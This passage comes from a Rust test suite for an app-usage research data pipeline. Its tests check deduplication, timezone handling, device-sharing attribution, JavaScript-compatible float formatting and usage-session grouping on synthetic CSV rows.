            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Mail,Activity Resumed,com.example.mail,2026-03-07 10:01:00,America/Chicago\n"
        );
        let changed_csv = baseline_csv.replacen("10:00:00", "10:02:00", 1);
        let baseline = run_pipeline_v2(baseline_csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("baseline ordered checkpoint");
        let changed = run_pipeline_v2(changed_csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("reordered checkpoint");
        let baseline_parse = &baseline.workflow_query_group_checkpoints["parse_events"];
        let changed_parse = &changed.workflow_query_group_checkpoints["parse_events"];
        assert_eq!(
            baseline_parse.row_membership_digest,
            changed_parse.row_membership_digest
        );
        assert_eq!(
            baseline_parse.classification_digest,
            changed_parse.classification_digest
        );
        assert_eq!(baseline_parse.payload_digest, changed_parse.payload_digest);
        assert_eq!(baseline_parse.schema_digest, changed_parse.schema_digest);
        assert_ne!(
            baseline_parse.row_order_digest,
            changed_parse.row_order_digest
        );
        assert_ne!(
            baseline_parse.temporal_state_digest,
            changed_parse.temporal_state_digest
        );
        assert_ne!(
            baseline_parse.terminal_digest,
            changed_parse.terminal_digest
        );
    }

    #[test]
    fn coalesce_duplicate_event_keys_is_participant_scoped_and_can_be_disabled() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Unknown importance: 1,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Unknown importance: 1,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P02,Target Child,Chat,Unknown importance: 1,com.example.chat,2026-03-07 10:00:00,America/Chicago\n"
        );
        let deduped = run_pipeline_v2(csv.as_bytes(), &test_options(), &[], &[], &[])
            .expect("deduplicated run");
        assert_eq!(deduped.processed_row_count, 2);

        let mut options = test_options();
        options.deduplicate_exact_rows = false;
        let retained =
            run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[]).expect("non-deduplicated run");
        assert_eq!(retained.processed_row_count, 3);
    }

    #[test]
    fn custom_interaction_remap_precedes_builtin_mapping() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Unknown importance: 1,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let mut options = test_options();
        options.interaction_type_remap = vec!["Unknown importance: 1 => Vendor Resume".into()];
        let result =
            run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[]).expect("remapped run");
        let output = String::from_utf8(result.app_csv_bytes.to_vec()).expect("UTF-8 CSV");
        assert!(output.contains("Vendor Resume"));
        assert!(!output.contains("App Usage"));
    }

    #[test]
    fn selected_timezone_filter_keeps_every_matching_row() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/New_York\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/New_York\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 11:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 11:01:00,America/Chicago\n"
        );
        let mut options = test_options();
        options.timezone_handling = "selected-filter".into();
        let result =
            run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[]).expect("selected-filter run");
        assert_eq!(result.original_row_count, 4);
        assert_eq!(result.processed_row_count, 2);
        assert_eq!(result.app_row_count, 1);
    }

    #[test]
    fn literal_none_timezone_rows_fall_back_to_utc_through_the_full_pipeline() {
        // "None" is a real observed export value for a missing timezone, not a
        // hypothetical. It must behave exactly like a blank cell all the way
        // through row construction — not just in the advisory inspectors —
        // otherwise selected-filter silently drops rows the inspection screen
        // promised to keep as UTC.
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,None\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,\n"
        );
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.timezone_handling = "selected-filter".into();
        let result =
            run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[]).expect("UTC-fallback run");
        assert_eq!(result.original_row_count, 2);
        assert_eq!(result.processed_row_count, 2);
        assert_eq!(result.app_row_count, 1);
        let output = String::from_utf8(result.app_csv_bytes.to_vec()).expect("UTF-8 CSV");
        assert!(!output.contains("None"));
    }

    #[test]
    fn selected_timezone_filter_rejects_an_absent_qualification_before_output_gates() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let mut options = test_options();
        options.timezone = "America/New_York".into();
        options.timezone_handling = "selected-filter".into();
        options.include_app_output = false;
        options.include_screen_output = false;
        let error = match run_pipeline_v2(csv.as_bytes(), &options, &[], &[], &[]) {
            Ok(_) => panic!("absent selected timezone must fail before output gates"),
            Err(error) => error,
        };
        assert!(error.contains("America/New_York"));
        assert!(error.contains("remove all rows"));
    }

    #[test]
    fn person_attribution_matches_exact_then_numerical_device_and_fails_on_gaps() {
        let sharing = parse_device_sharing(
            b"Participant_ID,Sharing_Status\nP100,Shared\ncohort-200-D2,Non-Shared\n",
        )
        .expect("case-insensitive support headers");
        assert_eq!(
            sharing_status_for("P100", &sharing).unwrap(),
            SharingStatus::Shared
        );
        assert_eq!(
            sharing_status_for("other-200-D2", &sharing).unwrap(),
            SharingStatus::NonShared
        );
        let error = sharing_status_for("other-200-D1", &sharing).unwrap_err();
        assert!(error.contains("sharing table must cover every device"));
    }

    #[test]
    fn person_attribution_applies_survey_override_and_kids_shell_default() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P100,,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P100,,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n",
            "Study,P100,,Kids Home,Activity Resumed,com.amazon.tahoe,2026-03-07 10:02:00,America/Chicago\n",
            "Study,P100,,Kids Home,Activity Paused,com.amazon.tahoe,2026-03-07 10:03:00,America/Chicago\n"
        );
        let mut options = test_options();
        options.enable_person_attribution = true;
        options.minimum_usage_duration = 0.0;
        let result = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles {
                device_sharing_csv: b"participant_id,sharing_status\nP100,Shared\n",
                survey_attribution_csv:
                    b"participant_id,event_timestamp,users\nP100,2026-03-07 10:00:00,Other\n",
                ..PipelineV2SupportFiles::default()
            },
        )
        .expect("attribution run");
        let output = String::from_utf8(result.app_csv_bytes.to_vec()).unwrap();
        assert!(output.contains("Other (From Survey)"));
        assert!(output.contains(NON_TARGET_PARTICIPANT_APP_USAGE));
        assert!(output.contains("Target Child"));
    }

    #[test]
    fn enabled_person_attribution_requires_device_sharing_support() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P100,,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P100,,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,America/Chicago\n"
        );
        let mut options = test_options();
        options.enable_person_attribution = true;
        let error = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .err()
        .expect("missing device-sharing file must fail");
        assert!(error.contains("Device sharing file is required"));
    }

    #[test]
    fn float_int_round_trip() {
        assert_eq!(normalize_float_string(1.0), "1.0");
        assert_eq!(normalize_float_string(0.0), "0.0");
        assert_eq!(normalize_float_string(-0.0), "0.0"); // JS String(-0) is "0"
        assert_eq!(normalize_float_string(60.0), "60.0");
        assert_eq!(normalize_float_string(-7.5), "-7.5");
    }

    #[test]
    fn float_decimal() {
        assert_eq!(normalize_float_string(0.5), "0.5");
        assert_eq!(normalize_float_string(1.5), "1.5");
        assert_eq!(normalize_float_string(0.1), "0.1");
        assert_eq!(normalize_float_string(0.1 + 0.2), "0.30000000000000004");
    }

    #[test]
    fn float_small_uses_exponential() {
        // 1e-5 < 1e-4 -> exponential form
        assert_eq!(normalize_float_string(1e-5), "1e-5");
        assert_eq!(normalize_float_string(1.5e-5), "1.5e-5");
    }

    #[test]
    fn float_large() {
        assert_eq!(normalize_float_string(1e20), "100000000000000000000.0");
        assert_eq!(normalize_float_string(1e21), "1e+21");
    }

    #[test]
    fn normalize_threshold_int_repr() {
        assert_eq!(format_threshold(1.0), "1");
        assert_eq!(format_threshold(12.0), "12");
    }

    #[test]
    fn small_number_collapses_to_round() {
        // 5.0000000000000004e-8 toPrecision(15) -> 5.00000000000000e-8
        // -> parseFloat -> 5e-8 -> toExponential -> "5e-8"
        let v: f64 = 3e-6 / 60.0;
        assert_eq!(normalize_float_string(v), "5e-8");
    }

    /// Every expectation below is the value V8 prints, produced by
    /// `node -e "console.log((<value>).toPrecision(<p>))"`. `ecma_to_precision`
    /// declares itself an implementation of `Number.prototype.toPrecision`, and
    /// `normalize_float_string` renders it into researcher-facing CSV cells, so
    /// the JS output is the specification, not an incidental detail.
    #[test]
    fn ecma_to_precision_matches_javascript_to_precision() {
        let cases: &[(f64, u32, &str)] = &[
            // Zero takes its own branch: one digit, then a padded fraction.
            (0.0, 1, "0"),
            (0.0, 3, "0.00"),
            (0.0, 17, "0.0000000000000000"),
            // exp >= 0 and exp == precision - 1: every digit sits left of the
            // point and the integer is padded, never truncated.
            (5.0, 1, "5"),
            (999.999, 6, "999.999"),
            // exp >= 0 and exp < precision - 1: the point splits the digits.
            (1.5, 3, "1.50"),
            (1234.5678, 6, "1234.57"),
            (999.999, 7, "999.9990"),
            (999.999, 17, "999.99900000000002"),
            // -6 <= exp < 0: leading zeros before the significant digits, and
            // 1e-6 is the last magnitude that stays in positional form.
            (0.1, 2, "0.10"),
            (0.3333333333333333, 3, "0.333"),
            (0.30000000000000004, 17, "0.30000000000000004"),
            (0.000001, 1, "0.000001"),
            (0.000001, 15, "0.00000100000000000000"),
            // exp >= precision: exponential form.
            (123456789.0, 3, "1.23e+8"),
            (1e21, 3, "1.00e+21"),
            // exp < -6: exponential form, including three-digit exponents.
            (5e-8, 1, "5e-8"),
            (5e-8, 15, "5.00000000000000e-8"),
            (5e-8, 17, "4.9999999999999998e-8"),
            (-5e-8, 3, "-5.00e-8"),
            (1e-7, 17, "9.9999999999999995e-8"),
            (0.000001, 17, "9.9999999999999995e-7"),
            (1e-100, 3, "1.00e-100"),
            (1.2345678901234567e-9, 15, "1.23456789012346e-9"),
            // Rounding is decided on the true binary value, not the literal:
            // 9.95 is stored as 9.9499999..., so it rounds down.
            (9.95, 2, "9.9"),
            (9.95, 21, "9.94999999999999928946"),
            (0.1, 21, "0.100000000000000005551"),
            // Carry out of the leading digit raises the exponent and drops the
            // digit that fell off the end.
            (999.999, 1, "1e+3"),
            (999.999, 2, "1.0e+3"),
            (999.999, 3, "1.00e+3"),
        ];
        for (value, precision, expected) in cases {
            assert_eq!(
                ecma_to_precision(*value, *precision),
                *expected,
                "({value}).toPrecision({precision})",
            );
        }
        assert_eq!(ecma_to_precision(f64::NAN, 3), "NaN");
        assert_eq!(ecma_to_precision(f64::INFINITY, 3), "Infinity");
        assert_eq!(ecma_to_precision(f64::NEG_INFINITY, 3), "-Infinity");

        // JS accepts up to 100 significant digits. Past the digits the
        // high-precision render supplies, the rest are zeros - checked on
        // values that are exact in binary so the expectation is unambiguous.
        for (value, expected) in [
            (1.0_f64, format!("1.{}", "0".repeat(34))),
            (0.5, format!("0.5{}", "0".repeat(34))),
            (1024.0, format!("1024.{}", "0".repeat(31))),
        ] {
            assert_eq!(
                ecma_to_precision(value, 35),
                expected,
                "({value}).toPrecision(35)",
            );
        }
    }

    /// The row writers' direct digits must equal the `write!`/`%:z` forms they
    /// replaced, in every zone, for every representable nanosecond timestamp.
    #[test]
    fn direct_timestamp_digits_match_the_formatted_ones() {
        let mut state = 0x9E37_79B9_7F4A_7C15_u64;
        let mut timestamps = vec![
            i64::MIN,
            i64::MAX,
            0,
            -1,
            -2_208_988_800_000_000_000, // 1900-01-01, historic local mean time
            1_710_054_000_000_000_000,  // 2024-03-10, a US DST start
            1_730_613_600_000_000_000,  // 2024-11-03, a US DST end
        ];
        for _ in 0..64 {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            timestamps.push(state as i64);
        }
        let mut checked = 0_usize;
        for tz in chrono_tz::TZ_VARIANTS {
            for &ts in &timestamps {
                let local = ts_to_local(ts, tz);
                for (direct, formatted) in [
                    {
                        let (mut direct, mut first) = (Vec::new(), true);
                        emit_event_timestamp(&mut direct, ts, tz, &mut first);
                        let mut formatted = Vec::new();
                        write_event_timestamp_fmt(&mut formatted, &local);
                        (direct, formatted)
                    },
                    {
                        let (mut direct, mut first) = (Vec::new(), true);
                        emit_session_timestamp(&mut direct, Some(ts), tz, &mut first);
                        let mut formatted = Vec::new();
                        write_session_timestamp_fmt(&mut formatted, &local);
                        (direct, formatted)
                    },
                    {
                        let (mut direct, mut first) = (Vec::new(), true);
                        emit_screen_timestamp(&mut direct, Some(ts), tz, &mut first);
                        let mut formatted = Vec::new();
                        write_screen_timestamp_fmt(&mut formatted, &local);
                        (direct, formatted)
                    },
                ] {
                    assert_eq!(
                        String::from_utf8(direct).unwrap(),
                        String::from_utf8(formatted).unwrap(),
                        "{tz} at {ts}",
                    );
                    checked += 1;
                }
            }
        }
        assert!(checked > 100_000, "only {checked} comparisons ran");
    }

    /// Rows are written in timestamp order and overwhelmingly share a local
    /// date, so the date string is memoized. The memo has to answer for the
    /// date it was asked about: a year, month, or day change all have to miss.
    #[test]
    fn the_local_date_memo_answers_only_for_the_date_it_was_asked_about() {
        let mut memo = LocalDateMemo::default();
        for (year, month, day, expected) in [
            (2026, 3, 7, "2026-03-07"),
            (2026, 3, 7, "2026-03-07"),
            (2025, 3, 7, "2025-03-07"),
            (2025, 4, 7, "2025-04-07"),
            (2025, 4, 8, "2025-04-08"),
            (2026, 3, 7, "2026-03-07"),
        ] {
            assert_eq!(memo.date_string(year, month, day).as_str(), expected);
        }
    }

    /// Expectations are `node -e "console.log((<value>).toExponential())"`.
    #[test]
    fn to_exponential_matches_javascript_to_exponential() {
        let cases: &[(f64, &str)] = &[
            (0.0, "0e+0"),
            (1.0, "1e+0"),
            (-1.0, "-1e+0"),
            (0.5, "5e-1"),
            (1.5, "1.5e+0"),
            (21.625, "2.1625e+1"),
            (123456789.0, "1.23456789e+8"),
            (1e20, "1e+20"),
            (1e21, "1e+21"),
            (0.1, "1e-1"),
            (0.30000000000000004, "3.0000000000000004e-1"),
            (0.3333333333333333, "3.333333333333333e-1"),
            (-0.3333333333333333, "-3.333333333333333e-1"),
            (1234.5678, "1.2345678e+3"),
            (999.999, "9.99999e+2"),
            (1e-4, "1e-4"),
            (9.9999e-5, "9.9999e-5"),
            (1e-6, "1e-6"),
            (9.999999e-7, "9.999999e-7"),
            (5e-8, "5e-8"),
            (-5e-8, "-5e-8"),
            (1e-10, "1e-10"),
            (1e-100, "1e-100"),
            (1.2345678901234567e-9, "1.2345678901234566e-9"),
        ];
        for (value, expected) in cases {
            assert_eq!(
                to_exponential(*value),
                *expected,
                "({value}).toExponential()",
            );
        }

        // decimal_to_exponential is the branch to_exponential takes when
        // ryu_js chose positional form, so drive it directly across the
        // integer/fraction boundary it has to locate.
        assert_eq!(decimal_to_exponential("0"), "0e+0");
        assert_eq!(decimal_to_exponential("-0.000"), "-0e+0");
        assert_eq!(decimal_to_exponential("7"), "7e+0");
        assert_eq!(decimal_to_exponential("70"), "7e+1");
        assert_eq!(decimal_to_exponential("700.0"), "7e+2");
        assert_eq!(decimal_to_exponential("1234.5678"), "1.2345678e+3");
        assert_eq!(decimal_to_exponential("-1234.5678"), "-1.2345678e+3");
        assert_eq!(decimal_to_exponential("0.5"), "5e-1");
        assert_eq!(decimal_to_exponential("0.0005"), "5e-4");
        assert_eq!(decimal_to_exponential("0.00050020"), "5.002e-4");
    }

    /// The two string rewrites `normalize_float_string` applies after
    /// `to_exponential`, documented in place as the JS regexes
    /// `/\.0+e/ -> "e"` and `/e([+-])0+/ -> "e$1"`.
    #[test]
    fn exponential_mantissa_and_exponent_are_trimmed_exactly() {
        // Only an all-zero fraction collapses, and only the fraction.
        assert_eq!(collapse_zero_mantissa("5.0e-8"), "5e-8");
        assert_eq!(collapse_zero_mantissa("5.000e-8"), "5e-8");
        assert_eq!(collapse_zero_mantissa("-1.0e-100"), "-1e-100");
        assert_eq!(collapse_zero_mantissa("5.01e-8"), "5.01e-8");
        assert_eq!(collapse_zero_mantissa("5.10e-8"), "5.10e-8");
        assert_eq!(collapse_zero_mantissa("5e-8"), "5e-8");
        // No exponent at all: the value passes through untouched, otherwise a
        // plain decimal would lose its fraction.
        assert_eq!(collapse_zero_mantissa("5.0"), "5.0");
        assert_eq!(collapse_zero_mantissa("100.0"), "100.0");

        // Leading zeros in the exponent go, the sign stays, and a lone zero
        // exponent keeps one digit rather than becoming a bare sign.
        assert_eq!(strip_exp_leading_zeros("1e-08"), "1e-8");
        assert_eq!(strip_exp_leading_zeros("1e+05"), "1e+5");
        assert_eq!(strip_exp_leading_zeros("1.25e-0010"), "1.25e-10");
        assert_eq!(strip_exp_leading_zeros("1e-8"), "1e-8");
        assert_eq!(strip_exp_leading_zeros("1e+0"), "1e+0");
        assert_eq!(strip_exp_leading_zeros("1e-000"), "1e-0");
        // An unsigned or absent exponent is left alone.
        assert_eq!(strip_exp_leading_zeros("1e8"), "1e8");
        assert_eq!(strip_exp_leading_zeros("100.0"), "100.0");
    }

    /// `normalize_float_string` is what writes a float into a CSV cell, so pin
    /// the rendering end to end. Expectations come from the documented
    /// JavaScript original: `parseFloat(v.toPrecision(15)).toExponential()`
    /// with the two regex rewrites below 1e-4, and
    /// `String(parseFloat(v.toPrecision(17)))` with a forced `.0` above it.
    /// `normalize_float_string` skips `round_to_precision(value, 17)` because it
    /// cannot change a finite f64. Check that over edge values and a million
    /// pseudo-random bit patterns spanning every exponent.
    #[test]
    fn precision_17_round_trip_is_the_identity() {
        let mut values = vec![
            f64::MIN_POSITIVE, f64::MAX, f64::MIN, f64::EPSILON, 5e-324, 1e-4, 0.1 + 0.2,
            1.0 / 3.0, 9007199254740993.0, 1e21, 123_456_789.123_456_79,
        ];
        let mut state = 0x9e37_79b9_7f4a_7c15_u64;
        for _ in 0..1_000_000 {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            values.push(f64::from_bits(state));
        }
        for value in values.into_iter().filter(|v| v.is_finite() && *v != 0.0) {
            assert_eq!(round_to_precision(value, 17).to_bits(), value.to_bits(), "{value:e}");
        }
    }

    #[test]
    fn normalize_float_string_matches_the_javascript_renderer() {
        let cases: &[(f64, &str)] = &[
            // At or above 1e-4: positional, and an integral value keeps a
            // trailing ".0" so a duration column never turns into an integer.
            (0.0, "0.0"),
            (-0.0, "0.0"),
            (1.0, "1.0"),
            (-1.0, "-1.0"),
            (60.0, "60.0"),
            (123456789.0, "123456789.0"),
            (1e20, "100000000000000000000.0"),
            (1e21, "1e+21"),
            (-1e21, "-1e+21"),
            (0.5, "0.5"),
            (-0.5, "-0.5"),
            (21.625, "21.625"),
            (1234.5678, "1234.5678"),
            (0.001, "0.001"),
            (1e-4, "0.0001"),
            (-1e-4, "-0.0001"),
            (0.0833333, "0.0833333"),
            // toPrecision(17) keeps the seventeen significant digits that make
            // these values distinguishable from their neighbours.
            (0.1 + 0.2, "0.30000000000000004"),
            (1.0 / 3.0, "0.3333333333333333"),
            (-1.0 / 3.0, "-0.3333333333333333"),
            (1.0 / 7.0, "0.14285714285714285"),
            (1.0000000000000002, "1.0000000000000002"),
            // Below 1e-4: exponential, mantissa and exponent trimmed.
            (9.9999e-5, "9.9999e-5"),
            (1e-5, "1e-5"),
            (1e-7, "1e-7"),
            (1.5e-7, "1.5e-7"),
            (5e-8, "5e-8"),
            (-5e-8, "-5e-8"),
            (1e-10, "1e-10"),
            (1.25e-10, "1.25e-10"),
            (1e-100, "1e-100"),
            (-1e-100, "-1e-100"),
            (1e-323, "1e-323"),
            (f64::from_bits(1), "5e-324"),
            // toPrecision(15) rounds away the digits that only exist because
            // the division was inexact.
            (3e-6 / 60.0, "5e-8"),
            (1.2345678901234567e-9, "1.23456789012346e-9"),
        ];
        for (value, expected) in cases {
            assert_eq!(
                normalize_float_string(*value),
                *expected,
                "normalize_float_string({value})",
            );
        }
        assert_eq!(normalize_float_string(f64::NAN), "NaN");
        assert_eq!(normalize_float_string(f64::INFINITY), "Infinity");
        assert_eq!(normalize_float_string(f64::NEG_INFINITY), "-Infinity");
    }

    #[test]
    fn ecma_to_fixed_half_away() {
        assert_eq!(ecma_to_fixed(0.045, 2), "0.04"); // V8 prints 0.04 because 0.045 is actually 0.0449999...
        assert_eq!(ecma_to_fixed(0.05, 2), "0.05");
        assert_eq!(ecma_to_fixed(21.625, 2), "21.63"); // exact tie -> round up
        assert_eq!(ecma_to_fixed(0.025, 2), "0.03"); // exact tie -> round up
        assert_eq!(ecma_to_fixed(0.0833333, 2), "0.08");
    }

    #[test]
    fn allocation_free_fixed_rounding_matches_the_decimal_reference() {
        let reference = |value: f64| ecma_to_fixed(value, 2).parse::<f64>().unwrap();
        for value in [
            -21.625,
            -0.045,
            -0.025,
            0.0,
            0.025,
            0.045,
            0.05,
            0.0833333,
            2.675,
            21.625,
            // Values below the smallest normal f64 carry a different exponent
            // encoding. toFixed(2) still reports them as zero, and the
            // allocation-free path has to agree there too.
            f64::MIN_POSITIVE,
            -f64::MIN_POSITIVE,
            f64::MIN_POSITIVE / 2.0,
            f64::from_bits(1),
            -f64::from_bits(1),
        ] {
            assert_eq!(
                ecma_round_fixed_f64(value, 2),
                reference(value),
                "allocation-free rounding disagrees for {value:e}",
            );
        }

        // Exercise the exact nanosecond values immediately around every
        // half-centihour boundary in a two-day range.
        for centihour in -4_800_i64..=4_800 {
            let boundary_ns = centihour * 36_000_000_000 + 18_000_000_000;
            for offset in -8_i64..=8 {
                let value = (boundary_ns + offset) as f64 / 3_600_000_000_000.0;
                assert_eq!(
                    ecma_round_fixed_f64(value, 2),
                    reference(value),
                    "boundary mismatch at {boundary_ns} + {offset} ns"
                );
            }
        }

        let mut state = 0x4d59_5df4_d0f3_3173_u64;
        for _ in 0..100_000 {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            let delta_ns = (state % 1_209_600_000_000_000) as i64 - 604_800_000_000_000;
            let value = delta_ns as f64 / 3_600_000_000_000.0;
            assert_eq!(ecma_round_fixed_f64(value, 2), reference(value));
        }

        // JS `toFixed` hands these back untouched rather than rounding them.
        assert!(ecma_round_fixed_f64(f64::NAN, 2).is_nan());
        assert_eq!(ecma_round_fixed_f64(f64::INFINITY, 2), f64::INFINITY);
        assert_eq!(
            ecma_round_fixed_f64(f64::NEG_INFINITY, 2),
            f64::NEG_INFINITY,
        );
        for huge in [1e21, -1e21, 1e300] {
            assert_eq!(ecma_round_fixed_f64(huge, 2), huge);
        }

        // A subnormal has no implicit leading mantissa bit and a fixed
        // exponent, and sits far below any scale a caller asks for, so it
        // rounds to zero at both a small and a large number of digits.
        let smallest = f64::from_bits(1);
        assert_eq!(ecma_round_fixed_f64(smallest, 2), 0.0);
        assert_eq!(ecma_round_fixed_f64(smallest, 20), 0.0);
        assert_eq!(ecma_round_fixed_f64(-smallest, 20), 0.0);
    }

    #[test]
    fn precision_15_round_trip() {
        let v: f64 = 5.0000000000000004e-8;
        let p = round_to_precision(v, 15);
        assert_eq!(p, 5e-8);
    }

    /// Build real canonical rows from raw events, so tests operate on the same
    /// values the pipeline does rather than on hand-assembled structs.
    /// Build app-usage rows directly: session grouping reads only
    /// participant, package and the reconstructed interval, so driving it
    /// through a full reconstruction would test the matcher, not this.
    fn session_usage_rows(episodes: &[(&str, &str, i64, i64)]) -> Vec<Row> {
        episodes
            .iter()
            .map(|(participant, package, start, stop)| {
                let mut row = rows_from_events(&[("2026-03-07 10:00:00", APP_USAGE, package)])
                    .pop()
                    .expect("one row");
                {
                    let data = row.edit_classification();
                    *data.participant_id = intern_deserialized_str(participant);
                    *data.app_package_name = intern_deserialized_str(package);
                    *data.interaction_type = intern_deserialized_str(APP_USAGE);
                }
                {
                    let data = row.edit_temporal();
                    *data.start_timestamp_ns = Some(*start);
                    *data.stop_timestamp_ns = Some(*stop);
                }
                row
            })
            .collect()
    }

    fn session_ids(
        episodes: &[(&str, &str, i64, i64)],
        policy: SessionGroupingPolicy,
    ) -> Vec<Option<i64>> {
        let mut rows = session_usage_rows(episodes);
        assign_usage_session_ids(&mut rows, SessionGroupingRules::published(policy));
        rows.iter().map(|row| row.usage_session_id).collect()
    }

    const SESSION_S: i64 = 1_000_000_000;

    #[test]
    fn session_grouping_is_off_by_default_and_numbers_from_zero_when_on() {
        // Two episodes 10 s apart. With no policy nothing is numbered at all,
        // which is what keeps existing output byte-identical.
        let episodes = [
            ("P01", "com.a", 0, 60 * SESSION_S),
            ("P01", "com.b", 70 * SESSION_S, 90 * SESSION_S),
        ];
        assert_eq!(
            session_ids(&episodes, SessionGroupingPolicy::None),
            vec![None, None]
        );
        // Under a 60 s rule the 10 s gap does not break, so both are session 0
        // — ids start at 0, not 1.
        assert_eq!(
            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
            vec![Some(0), Some(0)],
        );
    }

    /// The nested-episode defect reached through the WHOLE pipeline, on an
    /// option combination the product exposes.
    ///
    /// A foreground switch closes the previous app only because "Activity
    /// Resumed" is in `other_interaction_types_to_stop_usage_at` by default.
    /// A researcher who removes it — a supported setting — gets sessions that
    /// close only on their own stop, and therefore genuinely nested episodes.
    /// The published gap basis then measures the next gap from the SHORT
    /// nested episode and splits a session the participant never left.
    #[test]
    fn a_real_nested_episode_from_the_matcher_splits_only_under_the_published_basis() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            // A runs 12:00 to 12:30. B opens and closes inside it. C starts 20 s
            // after A closes, so nothing in this input is 60 s of silence.
            "Study,P01,Target Child,A,Activity Resumed,com.example.a,2026-03-07 12:00:00,UTC\n",
            "Study,P01,Target Child,B,Activity Resumed,com.example.b,2026-03-07 12:01:00,UTC\n",
            "Study,P01,Target Child,B,Activity Paused,com.example.b,2026-03-07 12:02:00,UTC\n",
            "Study,P01,Target Child,A,Activity Paused,com.example.a,2026-03-07 12:30:00,UTC\n",
            "Study,P01,Target Child,C,Activity Resumed,com.example.c,2026-03-07 12:30:20,UTC\n",
            "Study,P01,Target Child,C,Activity Paused,com.example.c,2026-03-07 12:31:00,UTC\n",
        );

        let sessions = |options: &PipelineV2Options| -> Vec<String> {
            let out = run_pipeline_v2_with_supports(
                csv.as_bytes(),
                options,
                PipelineV2SupportFiles::default(),
            )
            .expect("the run succeeds");
            parse_csv_to_records_with_physical_rows(&out.app_csv_bytes.to_vec())
                .iter()
                .map(|(_, row)| {
                    row.get("usage_session_id")
                        .cloned()
                        .expect("a grouped run publishes the session column")
                })
                .collect()
        };

        let mut options = test_options();
        options.session_grouping_policy = SessionGroupingPolicy::ZerrerSixtySeconds;

        // With the default other-stop list a foreground switch closes A at
        // 12:01, so no episode overlaps and the two bases cannot differ.
        assert_eq!(sessions(&options), vec!["0", "0", "1"]);
        let mut running_max = options.clone();
        running_max.session_gap_basis = SessionGapBasis::SessionRunningMaximumStop;
        assert_eq!(
            sessions(&running_max),
            vec!["0", "0", "1"],
            "with no overlap the basis cannot change the numbering",
        );

        // Remove the foreground-switch close. A now runs its full 30 min with B
        // nested inside it — the shape the published rules were never stated
        // over.
        options.other_stop_types = vec!["Device Shutdown".into()];
        assert_eq!(
            sessions(&options),
            vec!["0", "0", "1"],
            "the published basis measures C's gap from the nested episode and splits",
        );

        running_max = options.clone();
        running_max.session_gap_basis = SessionGapBasis::SessionRunningMaximumStop;
        assert_eq!(
            sessions(&running_max),
            vec!["0", "0", "0"],
            "measuring from the session's furthest stop sees the real 20 s gap",
        );

        // And the lineage says which number each verdict rested on, so the two
        // runs can be told apart from the output alone.
        running_max.emit_session_break_lineage = true;
        let out = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &running_max,
            PipelineV2SupportFiles::default(),
        )
        .expect("the lineage run succeeds");
        let flags: Vec<String> = parse_csv_to_records_with_physical_rows(&out.app_csv_bytes.to_vec())
            .iter()
            .map(|(_, row)| {
                row.get("any_app_usage_flags")
                    .cloned()
                    .expect("the flags column is always published")
            })
            .collect();
        assert_eq!(
            flags,
            vec![
                "['SESSION 0 OPEN']".to_string(),
                // B starts 60 s after A starts but INSIDE it, so the gap from
                // the running maximum is negative.
                "['SESSION 0 JOIN GAP -1740 S']".to_string(),
                "['SESSION 0 JOIN GAP 20 S']".to_string(),
            ],
        );
    }

    /// Build episodes carrying a study id and a username as well, so the two
    /// classification dimensions that vary WITHIN a participant can be tested.
    /// The four-tuple helper above cannot express either.
    fn scoped_usage_rows(episodes: &[(&str, &str, &str, &str, i64, i64)]) -> Vec<Row> {
